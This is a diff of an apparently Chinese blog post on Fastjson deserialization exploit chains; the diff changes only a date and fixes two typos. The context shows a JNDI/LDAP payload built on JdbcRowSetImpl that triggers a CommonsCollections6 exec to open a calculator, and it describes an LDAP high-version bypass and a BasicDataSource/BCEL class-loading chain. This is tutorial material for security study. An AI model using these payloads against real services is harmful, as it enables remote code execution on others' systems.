@@ -222,7 +222,7 @@
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Sun Apr 20 2025 16:28:43 GMT+0800">2025-04-20</span>
+                <span class="datetime" data-updated="Wed Apr 23 2025 17:16:40 GMT+0800">2025-04-23</span>
             </span>
         
 
@@ -320,7 +320,7 @@
 <p>这里我用工具起一个ldap服务器，再改一下客户端代码就好了</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1/HuoyZUQEBX/CommonsCollections6/Exec/eyJjbWQiOiJvcGVuIC1hIGNhbGN1bGF0b3IifQ==\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="LDAP高版本绕过"><a href="#LDAP高版本绕过" class="headerlink" title="LDAP高版本绕过"></a>LDAP高版本绕过</h4><p>如果要高版本绕过，依旧是选择本地恶意类加载就好，用到beanfactory即刻，这里就不掩饰了</p>
+<h4 id="LDAP高版本绕过"><a href="#LDAP高版本绕过" class="headerlink" title="LDAP高版本绕过"></a>LDAP高版本绕过</h4><p>如果要高版本绕过，依旧是选择本地恶意类加载就好，用到beanfactory即可，这里就不演示了</p>
 <h3 id="基于BasicDataSouce的利用链"><a href="#基于BasicDataSouce的利用链" class="headerlink" title="基于BasicDataSouce的利用链"></a>基于BasicDataSouce的利用链</h3><p>这个和tomcat相关，好处是可以不出网，用到本地的恶意类加载</p>
 <p>tomcat有一个<code>org.apache.bcel.util.ClassLoader</code>类，里面有defineClass实现类加载</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250420154253.png" ></p>
